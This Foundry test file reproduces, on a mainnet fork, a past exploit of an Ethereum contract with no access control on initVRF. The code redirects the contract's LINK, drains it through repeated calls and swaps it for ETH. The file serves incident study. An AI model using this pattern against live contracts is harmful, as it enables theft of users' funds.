// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4k USD
// Attacker : https://etherscan.io/address/0xda97a086fc74b20c88bd71e12e365027e9ec2d24
// Attack Contract : https://etherscan.io/address/0xd76c5305d0672ce5a2cdd1e8419b900410ea1d36
// Vulnerable Contract : https://etherscan.io/address/0xf340bd3eb3e82994cff5b8c3493245edbce63436
// Attack Tx : https://etherscan.io/tx/0x103b4550a1a2bdb73e3cb5ea484880cd8bed7e4842ecdd18ed81bf67ed19e03c

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf340bd3eb3e82994cff5b8c3493245edbce63436#code

// @Analysis
// Post-mortem : https://t.me/defimon_alerts/1733
// Twitter Guy : N/A
// Hacking God : https://t.me/defimon_alerts/1733

contract Contract0xf340 is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 23232613 - 1;

    IWETH weth = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 link = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    Ivictim victim = Ivictim(0xF340bd3eB3E82994CfF5B8C3493245EDbcE63436);
    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {

       //The victim contract (0xf340) lacks access control in its initVRF function allowing
       //an attacker to set an address into storage and calling the function 0x607d60e6 with 
       //a 0 ether value which transfers LINK to that address set by the attacker.
       victim.initVRF(address(this), address(link));

       uint256 slot = 0 ether;
       for (uint256 i = 0; i < 80; i++) {
        (bool success, ) = address(victim).call(
            abi.encodeWithSelector(
                bytes4(0x607d60e6),
                slot
            )
        );
        require(success, "call failed");
       }

       uint256 attackerLinkBal = link.balanceOf(address(this));
       link.approve(address(router), attackerLinkBal);

       address[] memory path = new address[](2);
       path[0] = address(link);
       path[1] = address(weth);
       router.swapExactTokensForETH(attackerLinkBal, 1, path, address(this), block.timestamp + 300);


    }

    fallback() external payable {}
}

    interface Ivictim {
        function initVRF(address arg0, address arg1) external;


    }

